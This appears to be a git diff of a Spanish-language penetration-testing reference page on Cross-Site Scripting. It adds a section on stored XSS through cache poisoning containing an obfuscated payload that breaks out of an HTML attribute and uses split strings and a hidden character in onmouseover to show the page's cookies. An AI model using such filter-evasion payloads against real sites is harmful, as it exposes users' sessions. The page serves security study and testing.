@@ -1,9 +1,9 @@
 ---
+icon: syringe
 description: >-
   Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad web frecuente
   que permite a los atacantes inyectar scripts maliciosos en las páginas web
   vistas por los usuarios.
-icon: syringe
 cover: ../../../.gitbook/assets/1731705666033.jpg
 coverY: 36.596461668070766
 layout:
@@ -93,6 +93,12 @@ div {
  imagen-de-fondo: url('Enter_Your_URL');
 }
 </𝘀𝘁𝘆𝗹𝗲>
+```
+
+### <mark style="color:purple;">XSS almacenado a través de envenenamiento de caché</mark>
+
+```
+"><a nope="%26quot;x%26quot;" onmouseover​="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 ```
 
 ## <mark style="color:blue;">XSS basado en DOM</mark>
